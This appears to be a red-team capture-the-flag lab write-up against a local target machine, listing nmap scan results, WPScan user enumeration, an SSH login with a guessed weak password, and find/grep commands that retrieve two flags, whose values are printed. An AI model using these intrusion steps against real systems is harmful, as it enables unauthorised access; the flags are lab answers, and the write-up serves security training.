# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sS -osscan-guess 192.168.1.110
MAC address: 00:15:5D:00:04:10 (Microsoft) 
  
This scan identifies the services below as potential points of entry:
- Target 1
  - 22/tcp     open     ssh
  - 80/tcp     open     http
  - 111/tcp    open     rpcbind
  - 139/tcp    open     netbios-ssn
  - 445/tcp    open     microsoft-ds
    

The following vulnerabilities were identified on target 1:
- Target 1
  - Weak Password
  - SSH Connection to Remote Server
  - Stealth Exploitation of Privalege Escalation 

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`:flag1{b9bbcb33e11b80be759c4e8448622482d}
    - **Exploit Used**
      - nmap -sS 192.168.1.110
        - wpscan -eu --url 192.168.1.110/wordpress 
        
      Weak Password
      - SSH Connection
        - michael@192.168.1.110 -p 22
          - password: michael
      - grep -rnw / -e 'flag1' 2> /dev/null 
  - `flag2.txt`: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
    - **Exploit Used**
      *Same as Flag_1*  
      - Weak Password
      - SSH Connection
        - michael@192.168.1.110
          password: michael
      - find / -iname *flag* 2> /dev/null
        - cat /var/www/flag2.txt